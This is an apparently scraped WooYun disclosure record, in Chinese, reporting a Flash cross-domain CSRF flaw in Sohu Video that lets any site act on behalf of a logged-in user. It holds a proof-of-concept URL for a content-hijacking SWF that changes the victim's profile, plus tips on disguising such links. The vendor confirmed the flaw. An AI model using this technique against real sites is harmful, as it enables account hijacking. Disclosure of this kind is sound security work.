{"id": 19078, "wybug_id": "wooyun-2015-0116229", "wybug_title": "搜狐视频劫持任意帐号（需交互）", "wybug_corp": "搜狐", "wybug_author": "jeary", "wybug_date": "2015-05-26 10:31", "wybug_open_date": "2015-07-10 11:08", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向公众公开  简要描述： 多谢跨站师Jin *.* 详细说明：  搜狐视频的crossdomain配置为*\n\n所以，任意域的flash都可发起请求我们随便找个操作试试，比如修改昵称：\n\n请求包：\nhttp://my.tv.sohu.com/user/profile/basic_update.donickname=baobaosb123&sex=0&usermail=&year=1970&month=01&day=00&city1=0&usersign=&address=&postcode=\n然后我们利用flash跨域发起这个请求：\n\n当然，能做的不止如此，基本上用户能发起的请求，都可以成功！PS：本来想着用“发私信”功能尝试做一个简单的蠕虫，但是奈何它有验证码，并且本人js水平有限，所以还是搁浅了。   漏洞证明：  POC：\nhttp://jeary.org/flashCSRF/ContentHijacking.html?objfile=http://jeary.org/flashCSRF/objects/ContentHijacking.swf&objtype=flash&target=http://my.tv.sohu.com/user/profile/basic_update.do&postdata=nickname=baobaosb987123x&usermail=&year=0000&month=00&day=00&city1=0&usersign=&address=&postcode=\n真实场景会多出如下一些东西：1.短链接2.隐藏表单3.跳转至正常页面..此处仅做证明，另外需要用户处于登录状态，点此链接即可触发各种操作.   修复方案：  *号配置是要不得滴   版权声明：转载请注明来源 jeary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-26 11:06 厂商回复： 感谢对搜狐安全关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-10 11:11 |    \t\t北丐 \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:20        | )\t\t \n  感谢对搜狐安全关注，稍后将会送上一堆狐狸公仔    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}